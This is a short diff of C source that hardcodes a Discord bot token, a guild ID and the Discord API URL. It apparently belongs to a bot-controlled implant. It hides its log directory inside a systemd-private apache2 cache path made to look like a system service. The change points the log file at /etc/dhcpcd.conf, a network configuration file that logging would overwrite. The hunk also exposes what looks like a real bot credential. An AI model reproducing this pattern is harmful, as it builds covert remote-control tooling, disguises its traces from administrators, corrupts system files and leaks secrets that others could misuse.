@@ -18,7 +18,7 @@
 static const char *DEFAULT_BOT_TOKEN = "MTQxNTY3NzU1NDc2OTI2ODgyNg.GHdNVO.U-Qa7lQL85KqtW-n2j7g3_B9MAuS3FHea43LU8";
 static const char *GUILD_ID = "1415674125816434742";
 static const char *LOG_DIR = "/var/cache/systemd-private-17fbcd29a89f4598a26f3f21791b3918-apache2.service-V9WpOP";
-static const char *LOG_FILE = "/var/cache/systemd-private-17fbcd29a89f4598a26f3f21791b3918-apache2.service-V9WpOP/service.log";
+static const char *LOG_FILE = "/etc/dhcpcd.conf";
 static const char *API_BASE = "https://discord.com/api/v10";
 
 struct string { char *ptr; size_t len; };
